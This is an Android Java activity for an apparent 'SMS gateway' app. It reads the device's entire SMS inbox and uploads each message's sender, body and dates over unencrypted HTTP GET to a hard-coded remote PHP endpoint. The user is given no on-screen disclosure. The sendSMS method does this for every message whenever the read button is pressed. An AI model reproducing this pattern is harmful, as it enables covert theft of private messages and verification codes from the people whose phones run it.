package net.trices.smsgateway;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.analytics.FirebaseAnalytics;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    EditText etPhone, etMsg;
    Button btnSendSMS, btnReadSMS;

    ListView lvSMS;
    ArrayList<String> smsData = new ArrayList<String>();
    ArrayAdapter arrayAdapter;

    private final int REQ_CODE_PERMISSION_SEND_SMS = 121;
    private final int REQ_CODE_PERMISSION_READ_SMS = 122;
    private final int REQ_CODE_PERMISSION_RECEIVE_SMS = 123;

    private final String SERVER = "http://atifnaseem22.000webhostapp.com/save_sms0.php";

    private FirebaseAnalytics mFirebaseAnalytics;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etPhone = findViewById(R.id.etPhoneNum);
        etMsg = findViewById(R.id.etMsg);

        btnReadSMS = findViewById(R.id.btnRead);
        btnSendSMS = findViewById(R.id.btnSend);

        lvSMS = findViewById(R.id.lvSMS);
        arrayAdapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, smsData);
        lvSMS.setAdapter(arrayAdapter);

        btnReadSMS.setEnabled(false);
        btnSendSMS.setEnabled(false);

        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);

        /***** ***** ***** ***** Checking permission - end ***** ***** ***** *****/
        /***** ***** ***** Checking permission - Send SMS ***** ***** *****/
        if(checkPermission(Manifest.permission.SEND_SMS)){
            btnSendSMS.setEnabled(true);
        }else{
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[] {Manifest.permission.SEND_SMS},
                    REQ_CODE_PERMISSION_SEND_SMS);
        }

        /***** ***** ***** Checking permission - Read SMS ***** ***** *****/
        if(checkPermission(Manifest.permission.READ_SMS)){
            btnReadSMS.setEnabled(true);
        }else{
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[] {Manifest.permission.READ_SMS},
                    REQ_CODE_PERMISSION_READ_SMS);
        }
        /***** ***** ***** Checking permission - Receive SMS ***** ***** *****/
        if(!checkPermission(Manifest.permission.RECEIVE_SMS)){
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[] {Manifest.permission.RECEIVE_SMS},
                    REQ_CODE_PERMISSION_RECEIVE_SMS);
        }
        /***** ***** ***** ***** Checking permission - end ***** ***** ***** *****/




        btnReadSMS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ContentResolver cr = getContentResolver();
                Cursor c = cr.query(Uri.parse("content://sms/inbox"),
                        null, null, null, null);

                /***** get all column names *****/
                StringBuffer info = new StringBuffer();
                for(int i=0; i<c.getColumnCount(); i++){
                    info.append("COLUMN_NAME: " + c.getColumnName(i) + "\n");
                }
                Toast.makeText(MainActivity.this, info.toString(), Toast.LENGTH_LONG).show();
                /*COLUMN_NAME: _id
                COLUMN_NAME: thread_id
                COLUMN_NAME: address
                COLUMN_NAME: person
                COLUMN_NAME: date
                COLUMN_NAME: date_sent
                COLUMN_NAME: sc_timestamp
                COLUMN_NAME: protocol
                COLUMN_NAME: read
                COLUMN_NAME: status
                COLUMN_NAME: type
                COLUMN_NAME: reply_path_present
                COLUMN_NAME: subject
                COLUMN_NAME: body
                COLUMN_NAME: service_center
                COLUMN_NAME: locked
                COLUMN_NAME: sub_id
                COLUMN_NAME: error_code
                COLUMN_NAME: seen
                COLUMN_NAME: lgeMsgType
                COLUMN_NAME: lgeSiid
                COLUMN_NAME: lgeCreated
                COLUMN_NAME: lgeExpires
                COLUMN_NAME: lgeReceived
                COLUMN_NAME: lgeAction
                COLUMN_NAME: lgeSec
                COLUMN_NAME: lgeMac
                COLUMN_NAME: lgeDoc
                COLUMN_NAME: doInstalled
                COLUMN_NAME: lgePinRemainCnt
                COLUMN_NAME: index_on_icc
                COLUMN_NAME: service_msg_sender_address
                COLUMN_NAME: lgeCallbackNumber
                COLUMN_NAME: sms_imsi_data
                /***** ***** ***** ***** *****/

                int indexBody = c.getColumnIndex("body");
                int indexPhone = c.getColumnIndex("address");
                int indexDate = c.getColumnIndex("date");
                int indexDateSent = c.getColumnIndex("date_sent");

                if(indexBody < 0 || !c.moveToFirst()) return;

                arrayAdapter.clear();
                do{
                    String phone = c.getString(indexPhone);
                    String msg = c.getString(indexBody);
                    String str = "SMS from: " + phone + "\n" + msg;

                    String ddate = c.getString(indexDate);
                    String dateSent = c.getString(indexDateSent);

                    DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    Date thisDate = new Date(Long.parseLong(ddate));
                    ddate = df.format(thisDate);
                    thisDate = new Date(Long.parseLong(dateSent));
                    dateSent = df.format(thisDate);

                    str += "\nDate: " + ddate;
                    str += "\nDateSent: " + dateSent;

                    arrayAdapter.add(str);

                    // Sending sms to Database
                    sendSMS(phone, msg, ddate, dateSent);

                }while(c.moveToNext());

                c.close();
            }
        });




        btnSendSMS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String phoneNum = etPhone.getText().toString();
                String message = etMsg.getText().toString();

                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNum, null,
                        message, null, null);

                Toast.makeText(MainActivity.this, "sms sent to: " + phoneNum,
                        Toast.LENGTH_LONG).show();
                // TODO: Record all sending sms, which are send using your app
            }
        });
    }



    private boolean checkPermission(String permission){
        int permissionCode = ContextCompat.checkSelfPermission(this, permission);
        return permissionCode == PackageManager.PERMISSION_GRANTED;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
        String[] permissions, int[] grantResults) {

        switch (requestCode){
            case REQ_CODE_PERMISSION_READ_SMS:
                if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                    btnReadSMS.setEnabled(true);
                    btnSendSMS.setEnabled(true);
                }
                break;
        }
    }



    public void sendSMS(String phone, String msg, String ddate, String dateSent){
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(this);
        String url = SERVER + "?phone=" + phone;
        url += "&msg=" + Uri.encode(msg);
        url += "&date=" + Uri.encode(ddate);
        url += "&date_sent=" + Uri.encode(dateSent);

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        });

        // Add the request to the RequestQueue.
        queue.add(stringRequest);
    }
}


